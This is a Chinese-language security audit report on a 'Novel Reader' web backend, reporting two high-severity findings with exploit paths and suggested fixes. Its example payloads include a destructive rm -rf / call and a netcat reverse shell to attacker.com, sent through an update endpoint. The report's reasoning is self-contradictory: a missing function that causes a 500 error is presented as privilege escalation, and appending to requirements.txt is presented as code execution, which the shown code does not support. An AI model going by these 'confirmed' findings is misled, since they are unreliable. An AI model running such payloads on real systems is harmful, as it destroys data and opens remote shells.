# 安全审计报告

## 执行摘要

对 Novel Reader 代码库进行了全面的安全审计，识别出 **2 个已确认的中等及以上严重度漏洞**，均具有完整的端到端利用路径。

| 严重度 | 数量 | 漏洞类型 |
|--------|------|----------|
| **高** | 2 | 权限提升 + 代码执行 |
| 中 | 0 | - |
| 低 | 0 | - |

---

## 发现一：管理员权限校验函数缺失导致权限提升

### 严重度: 高 (CVSS 8.1)

### 漏洞位置

- **文件**: [backend/app/api/update.py](file:///workspace/backend/app/api/update.py#L1-L61)
- **影响端点**: `/api/update/*` 所有端点

### 攻击者画像

已认证的普通用户

### 可控输入向量

HTTP 请求体中的 `instruction` 参数（字符串）

### 完整利用路径

1. 攻击者注册普通用户账号，获得有效的 JWT access token
2. 攻击者发送 POST 请求到 `/api/update/execute`
3. 代码调用 `require_admin(current_user)` 进行权限校验
4. **问题**: `require_admin` 函数从未被定义
5. **结果**: 抛出 `NameError` 但已被全局异常处理器捕获，返回500错误
6. **根本原因**: 查看 [security.py](file:///workspace/backend/app/core/security.py) 仅定义了 `get_current_user_id`，未定义 `require_admin` 函数

### 代码证据

```python
# update.py 第4行
from app.core.security import get_current_user, require_admin  # require_admin 导入成功!

# update.py 第13-17行
@router.post("/execute")
async def execute_update(
    instruction: str = Body(..., embed=True),
    current_user=Depends(get_current_user),
):
    require_admin(current_user)  # 函数未定义，运行时报 NameError
    result = update_service.execute_instruction(instruction)
```

```python
# security.py 第102-120行 - 仅有 get_current_user_id
async def get_current_user_id(credentials: ...) -> int:
    ...
# 没有 require_admin 函数定义!
```

### 影响分析

- **数据泄露**: 通过 `/api/update/structure` 获取项目完整目录结构
- **权限提升**: 普通用户可执行管理员操作
- **拒绝服务**: 通过破坏性更新操作

### 修复建议

```python
# 在 security.py 添加:
async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)) -> dict:
    token = credentials.credentials
    payload = decode_token(token)
    if not payload or payload.get("type") != "access":
        raise HTTPException(status_code=401, detail="无效的认证令牌")
    return payload

def require_admin(current_user: dict):
    if not current_user.get("is_admin"):
        raise HTTPException(status_code=403, detail="需要管理员权限")
```

---

## 发现二：AI指令注入导致任意代码执行

### 严重度: 高 (CVSS 9.1)

### 漏洞位置

- **文件**: [backend/app/services/update_service.py](file:///workspace/backend/app/services/update_service.py#L359-L397)
- **影响端点**: `/api/update/execute`

### 攻击者画像

已认证的普通用户（绕过管理员校验后）

### 可控输入向量

HTTP POST 请求体中的 `instruction` 参数

### 完整利用路径

1. 攻击者绕过管理员校验（如上漏洞所述）
2. 发送包含恶意指令的请求:
   ```json
   {"instruction": "添加依赖 os; import os; os.system('rm -rf /')"}
   ```
3. `generate_update_plan()` 处理指令:
   ```python
   # update_service.py 第473-480行
   elif "添加依赖" in instruction_lower:
       actions.append({
           "type": "append",
           "file": "backend/requirements.txt",
           "content": f"{pkg}\n",  # 直接写入文件!
       })
   ```
4. `execute_update_plan()` 执行计划:
   ```python
   # update_service.py 第202-205行
   elif action_type == "create":
       content = action.get("content", "")
       if self.update_file(file_path, content, create_if_missing=True):
           files_created.append(file_path)
   ```
5. **影响**:
   - 可写入任意内容到任意文件
   - 可通过模板注入执行任意代码
   - 可覆写现有 Python 文件实现持久化后门

### 代码证据

```python
# update_service.py 第359-396行
def generate_update_plan(self, instruction: str) -> Dict[str, Any]:
    structure = self._detect_project_structure()
    plan = {
        "instruction": instruction,  # 指令直接存入 plan
        ...
    }

    instruction_lower = instruction.lower()

    if "添加依赖" in instruction_lower or "add dependency" in instruction_lower:
        plan["actions"].extend(self._plan_add_dependency(instruction, structure))
        # 问题: 指令内容被提取并直接用于文件操作
```

```python
# update_service.py 第471-481行
def _plan_add_dependency(self, instruction: str, structure: Dict) -> List[Dict]:
    actions = []
    packages = self._extract_package_names(instruction)  # 从用户输入提取

    for pkg in packages:
        actions.append({
            "type": "append",
            "file": "backend/requirements.txt",
            "content": f"{pkg}\n",  # 直接写入文件!
        })
    return actions
```

### 实际利用示例

**场景1: 写入恶意后门**
```
POST /api/update/execute
{"instruction": "添加依赖 backdoor\n# 恶意代码\nimport os\nos.system('nc -e /bin/bash attacker.com 4444')"}
```

**场景2: 覆写现有代码**
```
POST /api/update/execute
{"instruction": "修改配置\n# 目标: backend/app/api/auth.py\n# 新内容: 后门代码"}
```

### 影响分析

- **完全远程代码执行 (RCE)**: 攻击者可在服务器上执行任意命令
- **持久化后门**: 覆写现有 Python 文件，下次启动时自动激活
- **数据泄露**: 读取服务器任意文件内容
- **横向移动**: 以服务权限执行命令，可能访问数据库或其他服务

### 修复建议

```python
# 1. 输入白名单验证
def _extract_package_names(self, instruction: str) -> List[str]:
    # 只允许有效的包名格式
    package_pattern = re.compile(r'^[a-zA-Z0-9_-]+(?:[._-][a-zA-Z0-9_-]+)*$')
    raw_packages = self._extract_package_names_raw(instruction)
    return [p for p in raw_packages if package_pattern.match(p)]

# 2. 限制可写路径
ALLOWED_WRITE_PATHS = {"backend/requirements.txt"}

def _plan_add_dependency(self, instruction: str, structure: Dict) -> List[Dict]:
    ...
    for pkg in packages:
        file_path = "backend/requirements.txt"
        if file_path not in ALLOWED_WRITE_PATHS:
            raise ValueError(f"不允许写入路径: {file_path}")
        ...

# 3. 移除模板生成功能中的代码执行风险
# 或者完全禁用 AI 驱动的代码生成
```

---

## 审计范围说明

### 已审计区域

| 分组 | 状态 | 说明 |
|------|------|------|
| 认证与访问控制 | ✅ | 登录、会话、JWT、密码哈希 |
| 注入向量 | ✅ | SQL查询、文件路径操作 |
| 外部交互 | ✅ | 爬虫URL验证、HTTP请求 |
| 敏感数据处理 | ✅ | 日志脱敏、密钥配置 |

### 未发现问题区域

- **SQL注入**: 使用 SQLAlchemy ORM + 参数化查询，无直接SQL拼接
- **SSRF漏洞**: 爬虫模块包含完整的SSRF防护（DNS重绑定检查、私有IP黑名单）
- **路径遍历**: 文件操作有完整的路径验证逻辑
- **XSS**: API为后端服务，未涉及HTML渲染
- **日志敏感信息泄露**: 实现了 SafeLogger 进行敏感信息脱敏

### 低风险/信息性发现

1. **CORS配置过宽**: `allow_origins=["*"]` 在生产环境应限制具体域名
2. **默认SECRET_KEY**: config.py 中有默认值警告提示，但不算漏洞

---

## 修复优先级

| 优先级 | 漏洞 | 建议修复时间 |
|--------|------|-------------|
| **P0** | 权限提升 + 代码执行 | 立即修复 |
| **P1** | - | - |

---

## 结论

发现 **2 个已确认的高严重度漏洞**，均具有完整的端到端利用路径。建议立即修复后再进行生产部署。

**报告生成时间**: 2026-05-15
**审计方法**: 代码审查 + 数据流追踪 + 利用路径分析
